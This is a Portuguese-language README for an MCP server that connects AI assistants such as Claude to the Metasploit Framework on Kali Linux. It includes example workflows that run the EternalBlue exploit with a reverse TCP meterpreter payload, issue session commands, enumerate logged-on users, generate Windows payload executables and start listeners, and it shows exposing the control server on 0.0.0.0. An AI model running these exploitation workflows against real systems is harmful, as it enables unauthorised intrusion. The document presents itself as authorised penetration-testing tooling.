# Servidor MCP Metasploit

Um servidor MCP (Model Context Protocol) para integração com o Metasploit Framework no Kali Linux.

## Demonstração

https://github.com/user-attachments/assets/39b19fb5-8397-4ccd-b896-d1797ec185e1

*Exemplo de uso do Metasploit MCP com Claude Desktop*

## Descrição

Este servidor MCP fornece uma ponte entre modelos de linguagem grandes como o Claude e a plataforma de teste de penetração Metasploit Framework. Permite que assistentes de IA acessem e controlem dinamicamente as funcionalidades do Metasploit através de ferramentas padronizadas, habilitando uma interface de linguagem natural para fluxos de trabalho complexos de testes de segurança.

## Funcionalidades

### Informações de Módulos
- **list_exploits**: Buscar e listar módulos de exploit disponíveis do Metasploit
- **list_payloads**: Buscar e listar módulos de payload disponíveis com filtragem opcional por plataforma e arquitetura

### Fluxo de Exploração
- **run_exploit**: Configurar e executar um exploit contra um alvo com opções para executar verificações primeiro
- **run_auxiliary_module**: Executar qualquer módulo auxiliar do Metasploit com opções personalizadas
- **run_post_module**: Executar módulos pós-exploração contra sessões existentes

### Geração de Payloads
- **generate_payload**: Gerar arquivos de payload usando RPC do Metasploit (salva arquivos localmente)

### Gerenciamento de Sessões
- **list_active_sessions**: Mostrar sessões atuais do Metasploit com informações detalhadas
- **send_session_command**: Executar um comando em uma sessão shell ou Meterpreter ativa
- **terminate_session**: Finalizar forçadamente uma sessão ativa

### Gerenciamento de Handlers
- **list_listeners**: Mostrar todos os handlers ativos e jobs em background
- **start_listener**: Criar um novo multi/handler para receber conexões
- **stop_job**: Terminar qualquer job ou handler em execução

## Pré-requisitos

- **Sistema Operacional**: Kali Linux 2023.1+ (ou Debian/Ubuntu)
- **Metasploit Framework**: Versão 6.0+
- **Python**: 3.10 ou superior
- **Dependências**: Pacotes Python necessários (veja requirements.txt)

## Instalação no Kali Linux

### 1. Atualizar Sistema

```bash
sudo apt update && sudo apt upgrade -y
```

### 2. Verificar Metasploit

```bash
# Verificar se Metasploit está instalado
msfconsole --version

# Se não estiver instalado:
sudo apt install metasploit-framework
```

### 3. Preparar Python

```bash
# Verificar Python
python3 --version

# Instalar dependências do sistema se necessário
sudo apt install python3 python3-pip python3-venv git
```

### 4. Clonar e Configurar

```bash
# Clonar repositório
git clone https://github.com/seu-usuario/metasploit-mcp-server.git
cd metasploit-mcp-server

# Criar ambiente virtual
python3 -m venv venv

# Ativar ambiente virtual
source venv/bin/activate

# Instalar dependências
pip install -r requirements.txt
```

### 5. Configurar Variáveis de Ambiente

```bash
# Criar arquivo .env (opcional)
cat > .env << EOF
MSF_PASSWORD=yourpassword
MSF_SERVER=127.0.0.1
MSF_PORT=55553
MSF_SSL=false
PAYLOAD_SAVE_DIR=/home/kali/payloads
EOF

# Ou exportar diretamente
export MSF_PASSWORD=yourpassword
export PAYLOAD_SAVE_DIR=/home/kali/payloads
```

## Configuração do Metasploit RPC

### Iniciar msfrpcd

```bash
# Terminal 1 - Iniciar o daemon RPC (deixe rodando)
msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553

# Verificar se está rodando
ps aux | grep msfrpcd
netstat -tlnp | grep 55553
```

### Testar Conexão

```bash
# Testar conexão manual
telnet 127.0.0.1 55553

# Ou usando curl
curl -X POST http://127.0.0.1:55553/api/ \
  -H "Content-Type: application/json" \
  -d '{"method":"auth.login","params":["yourpassword"]}'
```

## Uso do Servidor MCP

### Opções de Transporte

O servidor suporta dois métodos de transporte:

**HTTP/SSE (Server-Sent Events)** - Padrão para interoperabilidade:
```bash
python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
```

**STDIO (Standard Input/Output)** - Para Claude Desktop:
```bash
python MetasploitMCP.py --transport stdio
```

### Integração com Claude Desktop (Kali Linux)

Editar arquivo de configuração:
```bash
nano ~/.config/Claude/claude_desktop_config.json
```

Configuração para Kali Linux:
```json
{
    "mcpServers": {
        "metasploit": {
            "command": "/home/kali/metasploit-mcp-server/venv/bin/python",
            "args": [
                "/home/kali/metasploit-mcp-server/MetasploitMCP.py",
                "--transport",
                "stdio"
            ],
            "env": {
                "MSF_PASSWORD": "yourpassword",
                "PAYLOAD_SAVE_DIR": "/home/kali/payloads"
            }
        }
    }
}
```

### Para Outros Clientes MCP

Iniciar em modo HTTP:
```bash
python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
```

Endpoint SSE: `http://your-kali-ip:8085/sse`

## Considerações de Segurança

### ⚠️ AVISO IMPORTANTE DE SEGURANÇA

Esta ferramenta fornece acesso direto às capacidades do Metasploit Framework, que incluem recursos poderosos de exploração. Use com responsabilidade e apenas em ambientes onde você tem permissão explícita para realizar testes de segurança.

### Boas Práticas

- **Autorização**: Sempre valide e revise todos os comandos antes da execução
- **Ambiente**: Execute apenas em ambientes de teste segregados ou com autorização adequada
- **Impacto**: Esteja ciente de que comandos pós-exploração podem resultar em modificações significativas do sistema
- **Rede**: Use apenas em redes isoladas ou de laboratório
- **Logs**: Mantenha logs detalhados de todas as atividades

## Exemplos de Uso com Claude Desktop

### Comandos em Linguagem Natural

```
"Liste exploits relacionados ao SMB"
"Execute o exploit MS17-010 contra o host 192.168.1.100"
"Mostre as sessões ativas"
"Execute o comando 'whoami' na sessão 1"
"Gere um payload reverse TCP para Windows x64"
"Inicie um listener na porta 4444"
```

### Fluxo Completo de Pentesting

```
"Busque exploits para Windows SMB e execute contra 192.168.1.50 usando um payload meterpreter reverse TCP no meu IP 192.168.1.10 porta 4444"

"Liste as sessões ativas e execute 'getuid' na primeira sessão"

"Execute o módulo de enumeração de usuários logados na sessão ativa"

"Gere um payload executável Windows x64 com LHOST 192.168.1.10 e LPORT 5555"
```

## Exemplos de Fluxos de Trabalho

### Exploração Básica

1. **Descoberta**: `list_exploits("ms17_010")`
2. **Exploração**: `run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})`
3. **Verificação**: `list_active_sessions()`
4. **Execução**: `send_session_command(1, "whoami")`

### Pós-Exploração

1. **Enumeração**: `run_post_module("windows/gather/enum_logged_on_users", 1)`
2. **Comandos**: `send_session_command(1, "sysinfo")`
3. **Limpeza**: `terminate_session(1)`

### Gerenciamento de Handler

1. **Listener**: `start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)`
2. **Verificação**: `list_listeners()`
3. **Payload**: `generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})`
4. **Parar**: `stop_job(1)`

## Testes

### Instalação de Dependências de Teste

```bash
# Ativar ambiente virtual
source venv/bin/activate

# Instalar dependências de teste
pip install -r requirements-test.txt

# Ou usar instalador
python run_tests.py --install-deps
```

### Executar Testes

```bash
# Todos os testes
python run_tests.py --all

# Com cobertura
python run_tests.py --all --coverage

# Testes específicos
python run_tests.py --unit
python run_tests.py --integration
```

### Estrutura de Testes

- `tests/test_options_parsing.py` - Testes de parsing de opções
- `tests/test_helpers.py` - Testes de funções auxiliares
- `tests/test_tools_integration.py` - Testes de integração MCP
- `conftest.py` - Configuração de fixtures
- `pytest.ini` - Configuração do pytest

## Configuração Avançada

### Diretório de Payloads

Personalizar localização dos payloads:

```bash
# Variável temporária
export PAYLOAD_SAVE_DIR=/home/kali/custom-payloads

# Permanente no .bashrc
echo 'export PAYLOAD_SAVE_DIR=/home/kali/custom-payloads' >> ~/.bashrc
source ~/.bashrc

# Criar diretório com permissões
mkdir -p /home/kali/custom-payloads
chmod 755 /home/kali/custom-payloads
```

### Configuração de Rede

Para acesso remoto ao MCP:

```bash
# Permitir conexões externas
python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085

# Configurar firewall se necessário
sudo ufw allow 8085
```

## Solução de Problemas

### msfrpcd não inicia

```bash
# Verificar porta em uso
sudo netstat -tlnp | grep 55553

# Matar processo existente
sudo pkill msfrpcd

# Iniciar novamente
msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
```

### Erro de conexão

```bash
# Verificar serviço
ps aux | grep msfrpcd

# Verificar logs
tail -f ~/.msf4/logs/framework.log

# Testar conectividade
telnet 127.0.0.1 55553
```

### Permissões de arquivo

```bash
# Corrigir permissões do diretório de payloads
chmod 755 ~/payloads

# Corrigir permissões do projeto
chmod +x MetasploitMCP.py
```

### Problemas com Claude Desktop

```bash
# Verificar configuração
cat ~/.config/Claude/claude_desktop_config.json

# Verificar logs do Claude Desktop
tail -f ~/.config/Claude/logs/main.log

# Testar servidor manualmente
python MetasploitMCP.py --transport stdio
```

## Compatibilidade

- **Metasploit Framework**: 6.0+
- **Kali Linux**: 2023.1+
- **Debian/Ubuntu**: 20.04+
- **Python**: 3.10+
- **Claude Desktop**: Versões com suporte MCP

## Contribuindo

1. Faça fork do projeto
2. Crie uma branch para sua feature:
   ```bash
   git checkout -b feature/nova-funcionalidade
   ```
3. Commit suas mudanças:
   ```bash
   git commit -am 'Adiciona nova funcionalidade'
   ```
4. Push para a branch:
   ```bash
   git push origin feature/nova-funcionalidade
   ```
5. Abra um Pull Request

## Recursos Adicionais

### Scripts Úteis

Criar script de inicialização:
```bash
cat > start_metasploit_mcp.sh << 'EOF'
#!/bin/bash
# Script para iniciar Metasploit MCP

# Iniciar msfrpcd
echo "Iniciando msfrpcd..."
msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553 &

# Aguardar inicialização
sleep 5

# Ativar ambiente virtual e iniciar MCP
cd /home/kali/metasploit-mcp-server
source venv/bin/activate
python MetasploitMCP.py --transport stdio

echo "Metasploit MCP iniciado!"
EOF

chmod +x start_metasploit_mcp.sh
```

### Logs e Monitoramento

```bash
# Monitorar logs do Metasploit
tail -f ~/.msf4/logs/framework.log

# Monitorar processos
watch 'ps aux | grep -E "(msfrpcd|MetasploitMCP)"'

# Verificar conexões
watch 'netstat -tlnp | grep 55553'
```

## Licença

Apache 2.0

## Links Relacionados

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Model Context Protocol](https://modelcontextprotocol.io)
- [Claude Desktop](https://claude.ai)
- [Kali Linux](https://www.kali.org)
- [Documentação Metasploit](https://docs.metasploit.com/)

## Suporte

Para relatar bugs ou solicitar recursos:
- Abra uma [issue](https://github.com/seu-usuario/metasploit-mcp-server/issues)
- Entre em contato via [discussions](https://github.com/seu-usuario/metasploit-mcp-server/discussions)

---

**⚠️ Lembre-se: Use esta ferramenta apenas em ambientes autorizados para testes de penetração!**
